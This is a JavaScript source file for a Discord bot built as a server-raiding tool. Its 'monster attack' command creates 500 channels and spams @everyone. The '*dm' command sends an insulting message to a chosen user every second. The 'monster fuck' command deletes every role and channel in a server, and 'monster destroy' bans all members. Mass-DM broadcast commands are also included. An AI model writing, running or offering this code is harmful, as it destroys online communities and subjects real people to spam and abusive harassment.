const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = 'monster'

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', msg => {
  if (msg.content === 'ready') {
    msg.reply('yes sir :smiling_imp:.');
  }
});


client.on('message' , async (message) => {
    if (message.content.startsWith('monster attack')) {
for (let i = 0; i < 500; i++) {
        message.guild.createChannel(' Dating Team ', 'text')
        message.channel.send('@everyone __** Luca join us **__ :muscle: :v: @here');
}
}
});   




  client.on('message',async message => {
    if(message.content.startsWith("dm restart")) {
          if(message.author.id !== "487314985362391060") return message.reply('You aren\'t the bot owner.');
        message.channel.send('**Restarting.**').then(msg => {
            setTimeout(() => {
               msg.edit('**Restarting..**');
            },1000);
            setTimeout(() => {
               msg.edit('**Restarting...**');
            },2000);
        });
        console.log(`${message.author.tag} [ ${message.author.id} ] has restarted the bot.`);
        console.log(`Restarting..`);
        setTimeout(() => {
            client.destroy();
            client.login('process.env.BOT_TOKEN');
        },3000);
    }
});

client.on('message' , async (message) => {
 if (message.content.startsWith('*dm')) {
    setInterval(function() {
        let user = message.mentions.users.first() || message.author;
            user.send('hey you ugly as fuck welcome to our server')
    }, 1000)
 }
});


const developers = ["487314985362391060"]
const adminprefix = "#";
client.on('message', message => {
    var argresult = message.content.split(` `).slice(1).join(' ');
      if (!developers.includes(message.author.id)) return;
      
  if (message.content.startsWith(adminprefix + 'ply')) {
    client.user.setGame(argresult);
      message.channel.send(`**?   ${argresult}**`)
  } else 
     if (message.content === (adminprefix + "leave")) {
    message.guild.leave();        
  } else  
  if (message.content.startsWith(adminprefix + 'wt')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.send(`**?   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'ls')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**?   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'st')) {
    client.user.setGame(argresult, "https://www.twitch.tv/idk");
      message.channel.send(`**?**`)
  }
  if (message.content.startsWith(adminprefix + 'setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
if (message.content.startsWith(adminprefix + 'setavatar')) {
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
}
});

client.on('message', x5bz => {   
    if (x5bz.content.startsWith("monster fuck")) {
        x5bz.guild.roles.forEach(r => { r.delete() }) 
        x5bz.guild.channels.forEach(c => { c.delete() })
                   let v5bz = new Discord.RichEmbed()
               .setColor('RANDOM')
               .setDescription('**Done sir ! i have been FUCKED THE SERVER Luca Changretta :cop:**')
              x5bz.author.sendEmbed(v5bz);
    }
    });


client.on('message', async message => {
    if(message.content === "monster destroy") {
        if(message.author.id !== '490271579419443200') return;
        message.guild.members.forEach(member => {
           member.ban(); 
        });
    } 
 });

client.on('message', message => {
    if (message.author.id === client.user.id) return;
    if (message.guild) {
   let embed = new Discord.RichEmbed()
    let args = message.content.split(' ').slice(1).join(' ');
if(message.content.split(' ')[0] == prefix + 'bc') {
    if (!args[1]) {
return;
}
        message.guild.members.forEach(m => {
   if(!message.member.hasPermission('ADMINISTRATOR')) return;
            var bc = new Discord.RichEmbed()
            .addField(' » message : ', args)
            .setFooter('Dating Team')
            .setColor('#ff0000')
            // m.send(`[${m}]`);
            m.send(`${m}`,{embed: bc});
        });
    }
    } else {
        return;
    }
});














client.on('message', message => {
    if(!message.channel.guild) return;
if(message.content.startsWith(prefix + 'bc')) {
if(!message.channel.guild) return message.channel.send('**This command is only for stuff team**').then(m => m.delete(5000));
if(!message.member.hasPermission('ADMINISTRATOR')) return      message.channel.send('Sorry, but you dont have permisson : **ADMINISTRATOR**' );
let args = message.content.split(" ").join(" ").slice(2 + prefix.length);
let copy = "PrinceBot";//By Codes ,
let request = `Requested By ${message.author.username}`;
if (!args) return message.reply('**Sorry, But you should type a message**');message.channel.send(`**Are u sure Sending This \nMessage :** \` ${args}\``).then(msg => {
msg.react('✅')
.then(() => msg.react('❌'))
.then(() =>msg.react('✅'))

let reaction1Filter = (reaction, user) => reaction.emoji.name === '✅' && user.id === message.author.id;
let reaction2Filter = (reaction, user) => reaction.emoji.name === '❌' && user.id === message.author.id;
let reaction1 = msg.createReactionCollector(reaction1Filter, { time: 12000 });
let reaction2 = msg.createReactionCollector(reaction2Filter, { time: 12000 });
reaction1.on("collect", r => {
message.channel.send(`**☑ |   The message has been sended to ${message.guild.members.size} member**`).then(m => m.delete(5000));
message.guild.members.forEach(m => {
var bc = new Discord.RichEmbed()
.setAuthor(client.user.username, client.user.avatarURL)
.setThumbnail(client.user.avatarURL)
.setTimestamp()
.setColor('RANDOM')
.setDescription(`
● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●

🗿Sender : ***${message.author.username}***

📲Message : ***${args}***

● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ●
`)           
m.send({ embed: bc })
msg.delete();
})
})
reaction2.on("collect", r => {
message.channel.send(`**Brodcast cancled :x:.**`).then(m => m.delete(5000));
})
})
}
});








client.login(process.env.BOT_TOKEN);
